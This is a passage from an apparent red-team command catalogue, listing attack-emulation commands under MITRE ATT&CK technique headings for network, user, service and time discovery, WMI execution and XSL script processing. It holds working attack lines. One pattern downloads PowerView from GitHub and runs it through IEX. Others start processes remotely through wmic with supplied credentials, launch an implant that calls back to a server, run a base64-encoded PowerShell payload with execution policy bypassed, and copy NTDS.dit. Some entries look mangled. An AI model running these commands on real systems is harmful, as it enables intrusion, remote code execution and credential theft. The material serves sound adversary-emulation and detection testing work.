foreach ($port in $ports) {
    $test = new-object system.Net.Sockets.TcpClient
    $wait = $test.beginConnect("allports.exposed", $port, $null, $null)
    $wait.asyncwaithandle.waitone(250, $false) | Out-Null
    $totalports++ | Out-Null
    if ($test.Connected) {
        $result = "$port open" 
        Write-Host -ForegroundColor Green $result
        $result | Out-File -Encoding ASCII -append $file
        $totalopen++ | Out-Null
    }
    else {
        $result = "$port closed" 
        Write-Host -ForegroundColor Red $result
        $totalclosed++ | Out-Null
        $result | Out-File -Encoding ASCII -append $file
    }
}
$results = "There were a total of $totalopen open ports out of $totalports ports tested."
$results | Out-File -Encoding ASCII -append $file
Write-Host $results
* if [ -x "$(command -v arp)" ]; then arp -a; else echo "arp is missing from the machine. skipping..."; fi;
if [ -x "$(command -v ifconfig)" ]; then ifconfig; else echo "ifconfig is missing from the machine. skipping..."; fi;
if [ -x "$(command -v ip)" ]; then ip addr; else echo "ip is missing from the machine. skipping..."; fi;
if [ -x "$(command -v netstat)" ]; then netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c; else echo "netstat is missing from the machine. skipping..."; fi;
* ipconfig /all
netsh interface show interface
arp -a
nbtstat -n
net config
* ipconfig /all
net config workstation
net view /all /domain
nltest /domain_trusts
* nbtstat -n
* ping $TARGET$
* .\#{payload:28f9bf43-4f14-4965-9bd9-b70fd6993d8e} -Scan
* ./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan
* ./wifi.sh pref
* .\wifi.ps1 -Pref
* for ip in $(seq 190 199); do ping -c 1 $(echo #{domain.broadcast.ip} |
cut -d. -f-3).$ip -W 1; done
* ifconfig | grep broadcast
* ipconfig
## T1049: System Network Connections Discovery
* cmd.exe /c c:\windows\sysnative\netstat.exe -ano[b]
* netstat -ano[b]
* cmd.exe /c net session | find / "\\"
* net session | find / "\\"
* $syntaxList = "Invoke-ACLScanner", "Invoke-Kerberoast", "Find-DomainShare" 

foreach ($syntax in $syntaxList) {
#{SharpView} $syntax -}
* netstat
who -a
* netstat
net use
net sessions
* $syntaxList = #{syntax}
foreach ($syntax in $syntaxList) {
#{SharpView} $syntax -}
* Get-NetTCPConnection
* netstat -anto
* netstat -anto;
Get-NetTCPConnection
## T1033: System Owner/User Discovery
* getuid
* whoami /all /fo list
* cmd.exe /c whoami /all /fo list
* [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose
* users
w
who
* cmd.exe /C whoami
wmic useraccount get /ALL
quser /SERVER:"localhost"
quser
qwinsta.exe /server:localhost
qwinsta.exe
for /F "tokens=1,2" %i in ('qwinsta /server:localhost ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > computers.txt
@FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
* Import-Module .\powerview.ps1 -Force;
Get-NetUser -AdminCount | ConvertTo-Json -Depth 1
* whoami
* $env:username
* echo %username%
* whoami
* Import-Module .\powerview.ps1 -Force;
Get-NetUser -SPN | ConvertTo-Json -Depth 1
## T1007: System Service Discovery
* net.exe start >> C:\Windows\Temp\service-list.txt
* tasklist.exe
sc query
sc query state= all
* Get-Service
## T1569: System Services
## T1529: System Shutdown/Reboot
* poweroff
* poweroff --reboot
* halt --reboot
* shutdown -h now
* halt -p
* shutdown -r now
* reboot
## T1124: System Time Discovery
* Get-Date
* net time \\localhost
w32tm /tz
* Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'
* date -u +"%Y-%m-%dT%H:%M:%SZ"
## T1080: Taint Shared Content
## T1221: Template Injection
## T1205: Traffic Signaling
## T1537: Transfer Data to Cloud Account
## T1127: Trusted Developer Utilities Proxy Execution
* powercmd.exe /c/lateral_movement/invoke_executemsbuild
* powercmd.exe /c/code_execution/invoke_ntsd
## T1199: Trusted Relationship
## T1111: Two-Factor Authentication Interception
## T1552: Unsecured Credentials
## T1535: Unused/Unsupported Cloud Regions
## T1550: Use Alternate Authentication Material
## T1204: User Execution
## T1078: Valid Accounts
## T1125: Video Capture
* powercmd.exe /c/collection/WebcamRecorder
* python/collection/osx/webcam
## T1497: Virtualization/Sandbox Evasion
## T1600: Weaken Encryption
## T1102: Web Service
## T1047: Windows Management Instrumentation
* wmic /user:#{user_name} /password:P@ssw0rd1 /node:"$TARGET$" process call create #{process_to_execute}
* wmic /user:#{user_name} /password:#{password} /node:"$TARGET$" process call create notepad.exe
* wmic useraccount get /ALL /format:csv
* wmic /node:127.0.0.1 process call create "rundll32.exe #{dll_to_execute} #{function_to_execute}"
* wmic /node:$TARGET$ process call create "rundll32.exe #{dll_to_execute} StartW"
* wmic process call create notepad.exe
* wmic qfe get description,installedOn /format:csv
* wmic /user:#{user_name} /password:#{password} /node:"127.0.0.1" process call create #{process_to_execute}
* wmic /node:"127.0.0.1" service where (caption like "%vulnerable_service%")
* wmic /node:"$TARGET$" service where (caption like "%Spooler%")
* wmic /user:DOMAIN\Administrator /password:#{password} /node:"$TARGET$" process call create #{process_to_execute}
* powercmd.exe /c -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA
* $Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath("Win32_Process"))
$NewClass = $Class.Derive("Win32_Atomic")
$NewClass.Put()
Invoke-WmiMethod -Path Win32_Atomic -Name create -ArgumentList #{process_to_execute}
* wmic /node:$TARGET$ process call create "rundll32.exe $env:TEMP\calc.dll #{function_to_execute}"
* wmic process get caption,executablepath,commandline /format:csv
* $Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath("Win32_Process"))
$NewClass = $Class.Derive("#{new_class}")
$NewClass.Put()
Invoke-WmiMethod -Path #{new_class} -Name create -ArgumentList notepad.exe
* wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\vmtools.log;
cat $env:APPDATA\vmtools.log
* wmic /node:`"$TARGET$`" /user:`"$USER$`" /password:`"$PASSWORD$`" process call create "powercmd.exe /c.exe C:\Users\Public\s4ndc4t.exe -server $RANDOMURL$ -group 1010";
* wmic /node:`"$TARGET$`" /user:`"$USER$`" /password:`"$PASSWORD$`" process call create "cmd.exe C:\Users\Public\s4ndc4t.exe -server $RANDOMURL$ -group 1010";
* wmic.exe /NODE:*process call create*
* wmic.exe /NODE:*path AntiVirusProduct get*
* wmic.exe /NODE:*path FirewallProduct get*
* WmiPrvSE.exe
* wmic.exe /NODE: "192.168.0.1" process call create "*.exe"
* wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "at 9:00PM <path> ^> <path>"
* wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "cmd /c vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit > c:\not_the_NTDS.dit"
* powercmd.exe /c/lateral_movement/invoke_wmi
* powercmd.exe /c/persistence/elevated/wmi
## T1220: XSL Script Processing
* C:\Windows\Temp\msxsl.exe deliveries\files\test.xsl https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
* wmic process list /FORMAT:"#{local_xsl_file}"
* wmic process list /FORMAT:"#{remote_xsl_file}"
* wmic #{wmic_command} /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"
* C:\Windows\Temp\msxsl.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml #{xslfile}
* wmic.exeos|get|/FORMAT|.xsl
* wmic.exeprocess|list|/FORMAT|.xsl
* msxsl.exe
